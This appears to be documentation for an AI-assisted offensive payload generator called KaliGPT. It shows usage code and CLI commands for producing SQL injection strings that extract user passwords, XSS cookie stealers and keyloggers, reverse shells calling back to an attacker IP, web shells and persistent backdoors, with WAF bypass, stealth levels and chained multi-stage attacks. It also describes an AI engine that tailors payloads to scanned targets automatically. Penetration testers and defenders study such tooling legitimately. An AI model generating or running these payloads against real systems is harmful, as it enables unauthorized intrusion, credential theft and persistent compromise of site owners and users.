# KaliGPT Payload Generator Documentation

## Overview

The KaliGPT Payload Generator provides three ways to generate exploit payloads:

1. **Standard Generation** - Programmatic payload generation
2. **Template-Based** - Use pre-built, real-world payload templates
3. **AI-Powered** - Generate custom payloads based on target information

## Template-Based Payloads

### Available Templates

#### SQL Injection Templates
Located in: `payloads/templates/sqli_payloads.json`

**Categories:**
- Union-Based SQLi
- Boolean-Based Blind
- Time-Based Blind  
- Error-Based
- Stacked Queries
- Authentication Bypass
- Out-of-Band
- Second Order
- WAF Bypass

**Example Usage:**
```python
from payloads.generator import PayloadGenerator

gen = PayloadGenerator()

# Get SQLi payloads with variable substitution
payloads = gen.generate('sqli', 
                       use_template=True,
                       TABLE='users',
                       COLUMN='password',
                       CHAR='a',
                       POS='1',
                       VALUE='100')

# Access specific payload category
mysql_payloads = payloads['union_based']['mysql_extract']['payloads']
for payload in mysql_payloads:
    print(payload)
```

**Output:**
```sql
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,password,NULL FROM users--
```

#### XSS Templates
Located in: `payloads/templates/xss_payloads.json`

**Categories:**
- Reflected XSS (HTML, JavaScript, Attribute, URL contexts)
- Stored XSS
- DOM-Based XSS
- Filter Bypass (Encoding, Case, Tag Breaking, Null Byte)
- Advanced Payloads (Cookie Stealer, Keylogger, Form Hijack, BeEF Hook)
- WAF Bypass (CloudFlare, Akamai, Generic)
- Polyglot XSS

**Example Usage:**
```python
# Get XSS payloads with attacker domain
xss = gen.generate('xss',
                   use_template=True,
                   ATTACKER_DOMAIN='attacker.com',
                   BEEF_SERVER='192.168.1.100',
                   PORT='8080')

# Cookie stealer
stealer = xss['advanced_payloads']['cookie_stealer']['code']
print(stealer)

# Keylogger
keylogger = xss['advanced_payloads']['keylogger']['code']
print(keylogger)
```

#### Reverse Shell Templates
Located in: `payloads/templates/reverse_shells.json`

**Languages/Tools:**
- Bash (TCP/UDP)
- Python (PTY, Windows)
- Netcat (Traditional, FIFO)
- PHP
- Perl
- Ruby
- PowerShell
- Java
- Socat (Encrypted)
- Golang
- AWK
- Lua

**Example Usage:**
```python
# Get reverse shells
shells = gen.generate('reverse_shell',
                     use_template=True,
                     ATTACKER_IP='10.10.10.1',
                     ATTACKER_PORT='4444')

# Bash TCP reverse shell
bash_shell = shells['bash_tcp']['code']
print(f"Bash: {bash_shell}")

# Python PTY shell
python_shell = shells['python_pty']['code']
print(f"Python: {python_shell}")

# PowerShell reverse shell
ps_shell = shells['powershell_tcp']['code']
print(f"PowerShell: {ps_shell[:100]}...")
```

#### Web Shell Templates
Located in: `payloads/templates/php_webshells.json`

**Types:**
- Simple Shell
- Advanced Shell (with file upload, authentication)
- Mini Shell (one-liner)
- C99-style Shell
- WSO-style Shell (obfuscated)
- Upload Handler
- Eval Shell
- PHP Reverse Shell
- Persistent Backdoor

**Example Usage:**
```python
# Get web shells
webshells = gen.generate('web_shell',
                        use_template=True,
                        ATTACKER_IP='192.168.1.100',
                        ATTACKER_PORT='4444',
                        SECRET_KEY='my_secret_key_123')

# Simple shell
simple = webshells['simple_shell']['code']
print(simple)

# Advanced shell with features
advanced = webshells['advanced_shell']['code']
print(advanced)

# Persistent backdoor
backdoor = webshells['persistent_backdoor']['code']
print(backdoor)
```

## AI-Powered Payload Generation

Generate custom payloads based on target information using AI.

### Example Usage

```python
from payloads.generator import PayloadGenerator
from core.ai_engine import AIEngine

# Initialize with AI engine
ai_engine = AIEngine(config)
gen = PayloadGenerator(ai_engine=ai_engine)

# Target information
target_info = {
    'os': 'Linux',
    'web_server': 'Apache 2.4.52',
    'database': 'MySQL 8.0',
    'language': 'PHP 7.4',
    'waf': 'CloudFlare',
    'vulnerabilities': 'SQL Injection in login.php'
}

# Generate AI-powered SQLi payload
payload = gen.generate('sqli',
                      ai_generate=True,
                      target_info=target_info,
                      attacker_ip='10.10.10.1',
                      technique='union')

print(payload)
```

**AI will generate context-aware payloads:**
- WAF bypass techniques specific to CloudFlare
- MySQL-specific syntax
- PHP filter bypasses
- Appropriate encoding for Apache

### Target Information Fields

```python
target_info = {
    'os': 'Linux|Windows|Unix',
    'web_server': 'Apache|Nginx|IIS|Tomcat',
    'database': 'MySQL|PostgreSQL|MSSQL|Oracle|MongoDB',
    'language': 'PHP|Python|Java|ASP.NET|Node.js',
    'waf': 'CloudFlare|Akamai|ModSecurity|None',
    'vulnerabilities': 'Description of discovered vulnerabilities',
    'version': 'Specific version numbers',
    'framework': 'Laravel|Django|Spring|Rails'
}
```

## Command-Line Usage

### Via KaliGPT CLI

```bash
# Generate SQL injection payloads
kaligpt> payload sqli

# Generate with template
kaligpt> payload sqli --template --table users --column password

# Generate XSS payloads
kaligpt> payload xss

# Generate reverse shell
kaligpt> payload shell --ip 10.10.10.1 --port 4444

# Generate with AI
kaligpt> payload sqli --ai --target "MySQL 8.0 with WAF"

# List available templates
kaligpt> payload list
```

## Template Variables

Templates support variable substitution using `{{VARIABLE_NAME}}` syntax.

### Common Variables

| Variable | Description | Example |
|----------|-------------|---------|
| `{{ATTACKER_IP}}` | Attacker's IP address | 10.10.10.1 |
| `{{ATTACKER_PORT}}` | Listening port | 4444 |
| `{{ATTACKER_DOMAIN}}` | Attacker's domain | attacker.com |
| `{{TABLE}}` | Database table name | users |
| `{{COLUMN}}` | Column name | password |
| `{{COMMAND}}` | System command | whoami |
| `{{SECRET_KEY}}` | Authentication key | abc123 |
| `{{BEEF_SERVER}}` | BeEF server IP | 192.168.1.100 |
| `{{CHAR}}` | Character for blind SQLi | a |
| `{{POS}}` | Position in string | 1 |
| `{{VALUE}}` | Numeric value | 100 |

## Creating Custom Templates

### Template Structure

```json
{
  "category_name": {
    "template_name": {
      "name": "Human Readable Name",
      "description": "What this template does",
      "code": "The actual payload with {{VARIABLES}}",
      "usage": "How to use this payload",
      "variables": ["LIST", "OF", "REQUIRED", "VARIABLES"],
      "os": "linux|windows|all",
      "requirements": ["software", "requirements"],
      "stealth": "low|medium|high|very_high"
    }
  }
}
```

### Example Custom Template

```json
{
  "custom_sqli": {
    "postgres_dump": {
      "name": "PostgreSQL Data Dump",
      "description": "Extract data from PostgreSQL",
      "payloads": [
        "' UNION SELECT NULL,string_agg({{COLUMN}},',') FROM {{TABLE}}--",
        "' UNION SELECT NULL,array_to_string(array_agg({{COLUMN}}),',') FROM {{TABLE}}--"
      ],
      "variables": ["TABLE", "COLUMN"],
      "usage": "Set TABLE and COLUMN variables",
      "database": "postgresql"
    }
  }
}
```

Save to `payloads/templates/custom_template.json` and load:

```python
gen = PayloadGenerator()
gen._load_templates()  # Reload templates
```

## Best Practices

### 1. Use Templates for Standard Attacks
```python
# Good: Use proven payloads from templates
payloads = gen.generate('sqli', use_template=True, TABLE='users')

# Less optimal: Generate from scratch
payloads = gen.generate('sqli', technique='union')
```

### 2. Use AI for Custom Scenarios
```python
# When target has specific configurations
payload = gen.generate('xss',
                      ai_generate=True,
                      target_info={
                          'waf': 'Custom WAF',
                          'framework': 'React with CSP'
                      })
```

### 3. Combine Approaches
```python
# Get base payloads from template
base_payloads = gen.generate('sqli', use_template=True)

# Then ask AI to optimize for target
optimized = gen.generate('sqli',
                        ai_generate=True,
                        target_info=target_info,
                        technique='time-based')
```

## Integration with KaliGPT

### Automatic Payload Selection

KaliGPT automatically selects appropriate payloads based on:
- Discovered vulnerabilities
- Target technology stack
- Presence of security controls (WAF, IDS)
- Previous successful attacks

### Example Workflow

```bash
# 1. Scan target
KaliGPT> run nmap -sV -sC target.com

# AI analyzes: MySQL 8.0 detected, PHP application

# 2. Generate appropriate payloads
KaliGPT> payload sqli

# AI automatically:
# - Uses MySQL-specific templates
# - Applies WAF bypass if detected
# - Suggests next steps
```

## Security Considerations

⚠️ **IMPORTANT:** These payloads are for **authorized penetration testing only**.

### Usage Guidelines

1. **Authorization Required** - Only use on systems you have permission to test
2. **Legal Compliance** - Follow all applicable laws and regulations
3. **Responsible Disclosure** - Report vulnerabilities responsibly
4. **Documentation** - Keep detailed logs of testing activities
5. **Cleanup** - Remove all shells and backdoors after testing

### Payload Safety

Templates are categorized by stealth level:
- **Low** - Easily detected, use in controlled environments
- **Medium** - Moderate detection risk
- **High** - Harder to detect
- **Very High** - Advanced evasion techniques

## Troubleshooting

### Template Not Loading

```python
# Check if template files exist
import os
print(os.listdir('payloads/templates/'))

# Manually load template
with open('payloads/templates/sqli_payloads.json') as f:
    import json
    data = json.load(f)
```

### Variables Not Substituting

```python
# Ensure variable names match exactly (case-sensitive)
payloads = gen.generate('shell',
                       use_template=True,
                       ATTACKER_IP='10.10.10.1',  # Correct
                       attacker_ip='10.10.10.1')  # Won't work
```

### AI Generation Failed

```python
# Check AI engine initialization
if gen.ai_engine is None:
    print("AI engine not initialized")
    
# Fallback to templates
payloads = gen.generate('sqli', use_template=True)
```

## Advanced Features

### Chaining Payloads

```python
# Generate multi-stage attack
stage1 = gen.generate('sqli', use_template=True)
stage2 = gen.generate('web_shell', use_template=True)
stage3 = gen.generate('reverse_shell', use_template=True,
                     ATTACKER_IP='10.10.10.1',
                     ATTACKER_PORT='4444')
```

### Custom Encoding

```python
import base64
import urllib.parse

# Generate payload
payload = gen.generate('xss', use_template=True)

# Apply encoding
encoded = base64.b64encode(payload.encode()).decode()
url_encoded = urllib.parse.quote(payload)
```

## Resources

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [PentestMonkey Cheat Sheets](http://pentestmonkey.net/cheat-sheet)

---

**Last Updated:** December 9, 2025  
**Version:** 1.1.0
